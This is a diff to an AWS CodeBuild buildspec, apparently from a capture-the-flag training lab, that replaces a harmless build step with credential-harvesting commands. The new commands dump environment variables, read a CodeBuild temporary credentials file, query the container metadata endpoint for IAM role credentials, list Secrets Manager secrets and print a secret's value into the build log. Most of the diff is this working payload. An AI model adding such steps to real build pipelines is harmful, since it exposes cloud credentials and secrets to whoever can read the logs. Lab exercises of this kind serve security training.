@@ -3,6 +3,14 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - echo "[+] env"
+      - env
+      - echo "[+] creds path"
+      - cat /codebuild/output/tmp/env.sh || true
+      - echo "[+] metadata creds"
+      - curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI || true
+      - echo "[+] caller"
+      - aws sts get-caller-identity || true
+      - echo "[+] flag"
+      - aws secretsmanager list-secrets --region us-east-1 || true
+      - aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text || true
